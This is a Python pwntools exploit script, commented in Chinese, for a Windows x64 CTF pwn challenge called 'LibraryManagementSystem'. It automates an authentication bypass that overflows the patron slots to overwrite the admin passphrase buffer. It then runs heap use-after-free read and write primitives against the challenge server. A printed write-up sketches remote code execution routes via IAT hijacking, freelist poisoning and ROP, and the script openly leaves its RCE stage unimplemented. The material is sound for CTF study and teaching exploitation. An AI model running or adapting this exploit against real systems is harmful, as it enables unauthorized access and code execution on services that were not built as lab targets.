#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
12068 · LibraryManagementSystem · 2026 羊城杯 (DASCTF) · PWN (Windows x64)

单文件 EXP。攻击面：`win_server.exe -p <port> main.exe`（README §二）。
win_server 只是 socket <-> 子进程 stdin/stdout 的转发器（WS2_32 + CreateProcessA +
Job Object），**协议是裸字节流**，所以直接 TCP 连上去说话即可。

本脚本三段：
  [stage1] 认证绕过（已用 Unicorn 对真实机器码验证）
           连 enroll 17 个 patron；第 17 个落 slot 16，而
             pwds[i] = .bss 0x140019060 + (i+0x11)*0x20
           所以 pwds[16] = 0x140019480 = admin passphrase 的缓冲区。
           于是我们自己的口令变成管理台口令 -> 进入 ARCHIVES ADMINISTRATION CONSOLE。
  [stage2] 管理台堆原语（已用 Unicorn 对真实机器码验证）
           Add/Delete/Edit/Show/Broadcast 封装 + UAF 读/UAF 写/freelist 泄露
  [stage3] RCE —— **未实测**。main.exe 是 ASLR(HighEntropyVA)+DEP，只能靠堆
           freelist 投毒 + 地址泄露往上爬；本机 wine 不可用（沙箱），标定必须
           在真 Windows 上做。`--doc` 打印完整推导。拿到 shell 后由
           `run_shell_proof()` 负责 whoami / ipconfig 对照输出。

用法：
  python3 exploit_12068.py --host <靶机IP> --port 9999 --verify      # stage1+2
  python3 exploit_12068.py --doc                                    # stage3 路线
  python3 exploit_12068.py --host <靶机IP> --shell-proof            # 需 stage3 已接通
  python3 exploit_12068.py --selftest                               # 校对提示串

目标机：README 里的 Windows 虚拟机（VMware，账号 Admin/123 或 ctfer/123）。
"""
import argparse
import os
import sys
import time

from pwn import context, log, remote

context.log_level = "info"
context.arch = "amd64"

HERE = os.path.dirname(os.path.abspath(__file__))
# main.exe 可能在脚本同目录、work/12068_lms/、或题目附件目录
_EXE_CANDIDATES = [
    os.path.join(HERE, "main.exe"),
    os.path.join(HERE, "..", "work", "12068_lms", "main.exe"),
    os.path.join(HERE, "..", "work", "pwn-src", "LibraryManagementSystem", "main.exe"),
    os.path.join(HERE, "main.exe"),
]
EXE = next((p for p in _EXE_CANDIDATES if os.path.exists(p)),
           os.path.join(HERE, "main.exe"))

# ---------------------------------------------------------------- 提示串（.rdata 原文）
P_PROMPT    = b"> "                                       # 0x140015119 两个主菜单共用
P_GATEWAY   = b"PATRON IDENTITY GATEWAY"
P_ENROLL_ID = b"username:"                            # 0x140014da8
P_ENROLL_PW = b"length >= 8):"                        # 0x140014de0
P_SSO       = b"SSO Authorization Key: 0x"            # 0x140014e98
P_ADMIN_ASK = b"credentials/passphrase:"              # 0x1400148c8
P_ADMIN_OK  = b"Elevated access granted"              # 0x140014900
P_ADMIN_BAD = b"hash mismatch"                        # 0x140014940
P_CONSOLE   = b"admin@lib-core-srv:~$ "               # 0x1400147d9
P_ADD_IDX   = b"catalog slot index (0-15): "          # 0x140014010
P_ADD_SIZE  = b"document buffer size (max 0x400 bytes): "
P_DEL_IDX   = b"catalog index to deaccession (0-15): "
P_EDIT_IDX  = b"catalog index to amend (0-15): "
P_EDIT_SIZE = b"updated payload size (0-0x400): "
P_EDIT_DATA = b"revised document content:"
P_SHOW_IDX  = b"catalog index to inspect (0-15): "
P_BCAST     = b"broadcast/announcement (max 255 chars):"
P_ENTRY     = b">>> "

ALL_PROMPTS = [P_PROMPT, P_GATEWAY, P_ENROLL_ID, P_ENROLL_PW, P_SSO,
               P_ADMIN_ASK, P_ADMIN_OK, P_ADMIN_BAD, P_CONSOLE, P_ADD_IDX,
               P_ADD_SIZE, P_DEL_IDX, P_EDIT_IDX, P_EDIT_SIZE, P_EDIT_DATA,
               P_SHOW_IDX, P_BCAST, P_ENTRY]

# ---------------------------------------------------------------- 逆向常量
NB_PATRON     = 17           # slot 0..16（`cmp local_64,0x10; jle`）
SLOT_OVERLAP  = 16           # pwds[16] == 0x140019480 == admin passphrase
MAX_DOC_SIZE  = 0x400
BSS_ADMIN_KEY = 0x140019480
BSS_SSOKEY    = 0x140019050  # 泄露源: *(QWORD*)(private_heap + 0x88)


# ======================================================================
class LMS:
    """main.exe 的菜单协议客户端"""

    def __init__(self, host, port, pw=b"deadbeefcafe1234", timeout=8):
        self.host, self.port, self.timeout = host, port, timeout
        self.pw = pw
        self.p = None
        self.sso_key = None
        self.dat_140019050 = None       # = *(QWORD*)(heap+0x88)，由 SSO 泄露反推

    # ---------------- 连接/回滚 ----------------
    def connect(self):
        self.close()
        self.p = remote(self.host, self.port, timeout=self.timeout)
        log.info("connected %s:%d", self.host, self.port)

    def close(self):
        if self.p is not None:
            try:
                self.p.close()
            except Exception:
                pass
            self.p = None

    # ---------------- 底层 ----------------
    def _send(self, data, pause=0.03):
        self.p.send(data)
        if pause:
            time.sleep(pause)      # 让 "内容+\\n" 落在同一次 _read 里

    def _line(self, data, pause=0.03):
        self._send(data + b"\n", pause)

    def sync_main(self):
        self.p.recvuntil(P_PROMPT, timeout=self.timeout)

    def sync_console(self):
        self.p.recvuntil(P_CONSOLE, timeout=self.timeout)

    # ---------------- 主菜单 ----------------
    def to_patron_gateway(self):
        self.sync_main()
        self._line(b"2")
        self.p.recvuntil(P_GATEWAY, timeout=self.timeout)
        self.p.recvuntil(P_PROMPT, timeout=self.timeout)

    def staff_login(self):
        self.sync_main()
        self._line(b"1")
        self.p.recvuntil(P_ADMIN_ASK, timeout=self.timeout)
        self._line(self.pw)
        r = self.p.recvuntil([P_ADMIN_OK, P_ADMIN_BAD], timeout=6)
        return P_ADMIN_OK in r          # 成功时不消费 P_CONSOLE，留给下一个操作

    def staff_logout(self):
        self.sync_console()
        self._line(b"6")
        self.p.recvuntil(b"flushing audit buffers", timeout=self.timeout)

    # ---------------- patron enroll ----------------
    def enroll(self, pid, pwd):
        self.to_patron_gateway()
        self._line(b"1")
        self.p.recvuntil(P_ENROLL_ID, timeout=self.timeout)
        self._line(pid)
        self.p.recvuntil(P_ENROLL_PW, timeout=self.timeout)
        self._line(pwd)
        self.p.recvuntil(b"issued successfully", timeout=self.timeout)
        self.p.recvuntil(P_SSO, timeout=self.timeout)
        raw = self.p.recvuntil(b"\n", timeout=self.timeout).strip()
        try:
            self.sso_key = int(raw, 16)
            q = int.from_bytes(pwd.ljust(8, b"\x00")[:8], "little")   # pwd[0:8]
            self.dat_140019050 = self.sso_key ^ q
        except ValueError:
            self.sso_key = None
        return self.sso_key

    # ---------------- stage1 ----------------
    def stage1_bypass(self):
        log.info("stage1: enroll %d 个 patron，slot %d 覆盖 admin passphrase",
                 NB_PATRON, SLOT_OVERLAP)
        for i in range(NB_PATRON):
            pid = ("user%02d" % i).encode()
            pwd = self.pw if i == SLOT_OVERLAP else ("pw%08d" % i).encode()
            k = self.enroll(pid, pwd)
            log.info("  slot %2d id=%-8s pwd=%-16s sso=0x%016x",
                     i, pid.decode(), pwd.decode(), k or 0)
        if not self.staff_login():
            log.failure("stage1 失败：管理台认证被拒")
            return False
        log.success("stage1 成功：认证绕过 -> ARCHIVES ADMINISTRATION CONSOLE")
        log.info("  *(QWORD*)(heap+0x88) = 0x%016x  （若像 0x0000_01xx_xxxx_xxxx 就是堆地址；"
                 "否则是 _HEAP.Encoding 之类随机 key）", self.dat_140019050 or 0)
        return True

    # ---------------- 管理台原语 ----------------
    def _int(self, v):
        self._line(str(v).encode())

    def add(self, idx, size):
        """1. Catalog Ingestion：HeapAlloc(size+1)，**不读取内容**"""
        self.sync_console()
        self._line(b"1")
        self.p.recvuntil(P_ADD_IDX, timeout=self.timeout)
        self._int(idx)
        self.p.recvuntil(P_ADD_SIZE, timeout=self.timeout)
        self._int(size)
        r = self.p.recvuntil([b"archived into system", b"Error", b"Critical"], timeout=5)
        return b"archived into system" in r

    def delete(self, idx):
        """2. Deaccession：HeapFree，**不清 ptr / 不清 size** -> UAF 根源"""
        self.sync_console()
        self._line(b"2")
        self.p.recvuntil(P_DEL_IDX, timeout=self.timeout)
        self._int(idx)
        r = self.p.recvuntil([b"deaccessioned", b"Error", b"Notice"], timeout=5)
        return b"deaccessioned" in r

    def edit(self, idx, size, data):
        """3. Amend：把 data 写进 ptr[idx]（删除后即 UAF 写），上限 = 旧 stored size"""
        self.sync_console()
        self._line(b"3")
        self.p.recvuntil(P_EDIT_IDX, timeout=self.timeout)
        self._int(idx)
        self.p.recvuntil(P_EDIT_SIZE, timeout=self.timeout)
        self._int(size)
        self.p.recvuntil(P_EDIT_DATA, timeout=self.timeout)
        self._line(data)
        r = self.p.recvuntil([b"updated successfully", b"Error", b"failed"], timeout=5)
        return b"updated successfully" in r

    def show(self, idx, timeout=5):
        """4. Inspect：printf(">>> %s", ptr[idx])，没有长度限制 -> UAF 读"""
        self.sync_console()
        self._line(b"4")
        self.p.recvuntil(P_SHOW_IDX, timeout=self.timeout)
        self._int(idx)
        self.p.recvuntil(P_ENTRY, timeout=timeout)
        raw = self.p.recvuntil(b"\n", timeout=timeout)
        return raw.rstrip(b"\n")

    def broadcast(self, text):
        """5. Broadcast：写 catalog->announcement[0x100]（≤255 字节）"""
        self.sync_console()
        self._line(b"5")
        self.p.recvuntil(P_BCAST, timeout=self.timeout)
        self._line(text)
        return self.p.recvuntil([b"archive header", b"Error"], timeout=5)


# ======================================================================
def stage2_probe(c):
    """堆原语标定：泄露 + UAF 读写。返回给 stage3 用的 dict。"""
    info = {}
    assert c.add(0, 0x20), "add(0,0x20) 失败"
    assert c.add(1, 0x20), "add(1,0x20) 失败"
    assert c.add(2, 0x400), "add(2,0x400) 失败"
    log.info("stage2: 三个槽已分配（catalog = announcement[0x100] + sizes[16]@0x100 + ptrs[16]@0x140）")

    # D1: Add 不写内容 -> 未初始化泄露
    leak_raw = c.show(1)
    info["uninit"] = leak_raw
    log.info("  未初始化块 show(1) = %r", leak_raw)

    # D2: Delete 不清指针 -> dangling
    assert c.delete(0), "delete(0) 失败"
    assert c.delete(1), "delete(1) 失败"
    log.info("  slot0/slot1 已释放；ptrs[] 仍指向它们（dangling）")

    # D3: UAF 读 -> freelist Flink/Blink（%s 在第一个 0x00 处截断）
    raw = c.show(1)
    info["uaf_read"] = raw
    log.info("  UAF 读 show(1) = %r  （Flink 非零前缀；真机堆地址低字节非 0，通常 6 字节）", raw)

    # D4: UAF 写（写回已释放块的 freelist 头）
    payload = b"C" * 0x1F
    ok = c.edit(1, len(payload), payload)
    log.info("  UAF 写 edit(1) = %s", ok)
    info["uaf_write"] = ok

    # D5: 复用同 class -> 内容 = 我们写的
    assert c.add(3, 0x20), "add(3,0x20) 失败"
    body = c.show(3)
    info["reused"] = body
    log.info("  复用块 show(3) = %r  期望 %r", body, payload)
    if body == payload:
        log.success("  'UAF 写 + 复用' 在该目标上成立 -> 稳定堆写原语")
    else:
        log.warning("  复用内容不符（LFH 可能把不同 'size+1' 分到不同 class，需真机标定）")
    return info


# ======================================================================
def run_shell_proof(p, timeout=5):
    """拿到 shell（cmd.exe / powershell）后的取证输出，供录像与运维校验。
    期望输出（对照用）：
      whoami   -> <hostname>\\administrator  或  <hostname>\\ctfer
      ipconfig -> Windows IP 配置 / IPv4 地址: 192.168.x.x
    """
    proof = {}
    for cmd in (b"whoami", b"ipconfig"):
        p.sendline(cmd)
        time.sleep(0.8)
        try:
            out = p.recvrepeat(timeout)
        except Exception:
            out = b""
        proof[cmd.decode()] = out
        log.info("$ %s\n%s", cmd.decode(), out.decode("latin1", "replace"))
    who = proof.get("whoami", b"").lower()
    ok = ((b"\\" in who or b"nt authority" in who) and
          b"ipv4" in proof.get("ipconfig", b"").lower())
    log.success("shell 取证: %s", "OK（whoami + ipconfig 都有正常输出）"
                if ok else "输出不完整，检查 shell 类型/编码")
    return ok, proof


def stage3_rce(c, info):
    """RCE —— 未实现（需真 Windows 标定）。必须如实返回失败，不伪造。"""
    log.warning("stage3(RCE) 尚未实现：")
    log.warning("  main.exe = ASLR(HighEntropyVA) + DEP，程序内无 win/system/CreateProcess")
    log.warning("  目标上需先标定 3 件事（详见 --doc 与 notes）：")
    log.warning("    1) 私堆 HeapCreate(0,0,0x10000) 对 0x10..0x410 是否走 LFH")
    log.warning("    2) 0x88 处字段是堆地址还是 _HEAP.Encoding（本目标泄露值 = 0x%016x）",
                c.dat_140019050 or 0)
    log.warning("    3) catalog 表相对堆基址的固定偏移（拿到 -> 篡改 ptrs[]/sizes[] -> 任意读写）")
    return False


# ======================================================================
def cmd_selftest():
    """校对脚本里的提示串确实出现在 main.exe 里（防手抄错）"""
    if not os.path.exists(EXE):
        log.failure("%s 不存在（把 main.exe 放到脚本同目录）", EXE)
        return 1
    blob = open(EXE, "rb").read()
    bad = []
    for p in ALL_PROMPTS:
        hit = p in blob
        if not hit:
            bad.append(p)
        log.info("%-52r %s", p, "OK" if hit else "MISSING")
    if bad:
        log.failure("%d 个提示串在 main.exe 里找不到: %r", len(bad), bad)
        return 1
    log.success("全部 %d 个提示串与 main.exe 一致", len(ALL_PROMPTS))
    return 0


def cmd_doc():
    print("""
========================= stage3 (RCE) 推导 =========================
目标：main.exe  ASLR(HighEntropyVA)+DEP，CFG off；无 win/system/CreateProcess。

已确证原语（Unicorn 跑真机机器码验证，见 work/12068_lms/emulate_*.py）
  P1 认证绕过：enroll slot16 -> 覆盖 admin passphrase -> 管理台
  P2 Add 只 HeapAlloc(size+1)、从不写内容
  P3 Delete 只 HeapFree，不清 ptrs[i]/sizes[i] -> dangling（UAF / 二次 free）
  P4 Show = printf(">>> %s", ptrs[i])      -> UAF 读（freelist 指针非零前缀）
  P5 Edit = 把 ≤sizes[i] 字节写进 ptrs[i]   -> UAF 写（改 freelist Flink/Blink）
  P6 同 class 再 Add -> 复用该块，内容 = P5 写进去的 -> 稳定堆写

标定（必须在真 Windows 上做；本机 wine 不可用）
  C1 私堆是否 LFH：HeapCreate(0, 0, 0x10000) 是定长堆。用 P6 试
     add(A,0x20)+add(B,0x20)+delete(A)+add(C,0x20)；C 复用 A 地址 => backend
     size-class 复用（注意程序是 HeapAlloc(size+1)，所以 0x20 槽实际 class 是 0x30）。
  C2 0x88 字段：stage1 打印的 *(heap+0x88)。Win10/11 x64 的 _HEAP.Encoding 常在
     0x7c 附近（16B），所以 0x88 很可能是堆编码 key 而不是地址；需要堆地址时
     改用 P4（Show 打 freed chunk 的 Flink，低字节非 0 -> 6 字节）。
  C3 堆基址 -> catalog 表偏移：catalog 是 HeapCreate 后第 1 个分配（0x1c0），
     偏移按 Windows 版本恒定。拿到后：
       ptrs[i] = 目标地址, sizes[i] = 长度
     -> Show(i) = 任意地址读（%s，遇 0x00 停）
     -> Edit(i) = 任意地址写（≤sizes[i]，可含 \\x00 原始字节）

RCE 路线（按 C1/C2 标定结果选）
  R1 IAT 劫持：任意写把 main.exe IAT 里的 HeapAlloc/puts 换成 VirtualProtect
     （main.exe 已导入 VirtualProtect），shellcode 放堆上，先 VirtualProtect
     (堆页, RWX) 再跳过去。
  R2 freelist 投毒：free 侧 Vista+ 有 safe-unlink 校验（Flink->Blink == entry），
     优先用"分配侧取出"完成写；或先在自己可控区伪造一个 chunk 撑过校验。
  R3 栈迁移：若经 _HEAP.Lock.DebugInfo -> 进程锁链 / PEB->Ldr 走到模块基址，
     再找 pivot gadget 到堆上的 ROP 链（DEP 需要 VirtualProtect 前置）。

拿到 shell 后：`--shell-proof` 会执行 whoami / ipconfig 并按期望格式做对照，
用于给运维录屏（README §四）。
=====================================================================
""")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host")
    ap.add_argument("--port", type=int, default=9999)
    ap.add_argument("--password", default="deadbeefcafe1234",
                    help="写进 admin passphrase 的口令：8..31 字符，无 CR/LF")
    ap.add_argument("--verify", action="store_true", help="stage1 + stage2（默认动作）")
    ap.add_argument("--shell-proof", dest="shell_proof", action="store_true",
                    help="拿到 shell 后跑 whoami/ipconfig 取证（依赖 stage3）")
    ap.add_argument("--doc", action="store_true", help="打印 stage3 推导")
    ap.add_argument("--selftest", action="store_true", help="校对提示串")
    ap.add_argument("--retries", type=int, default=2, help="失败后重连次数（回滚）")
    args = ap.parse_args()

    if args.selftest:
        return cmd_selftest()
    if args.doc:
        cmd_doc()
        return 0
    if not args.host:
        ap.error("--host 必填（或用 --doc / --selftest）")

    pw = args.password.encode()
    if not (8 <= len(pw) <= 31) or b"\n" in pw or b"\r" in pw:
        log.failure("--password 必须 8..31 字符且不含换行")
        return 2

    c = LMS(args.host, args.port, pw)
    info = {}
    for attempt in range(args.retries + 1):
        try:
            c.connect()
            if not c.stage1_bypass():
                raise RuntimeError("stage1 认证绕过失败")
            info = stage2_probe(c)
            break
        except Exception as ex:
            log.failure("attempt %d/%d 失败: %s（回滚：断开重连）",
                        attempt + 1, args.retries + 1, ex)
            c.close()
            if attempt == args.retries:
                return 1
            time.sleep(0.5)

    if args.shell_proof:
        if stage3_rce(c, info):
            ok, _ = run_shell_proof(c.p)
            return 0 if ok else 1
        log.failure("stage3 未实现，无法提供 whoami/ipconfig 取证（不伪造输出）")
        c.close()
        return 2

    log.success("verify 完成：认证绕过 + 堆原语均按真机协议走通")
    log.info("下一步：--doc 看 RCE 推导；在真 Windows 上完成 C1/C2/C3 标定后实现 stage3_rce()")
    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
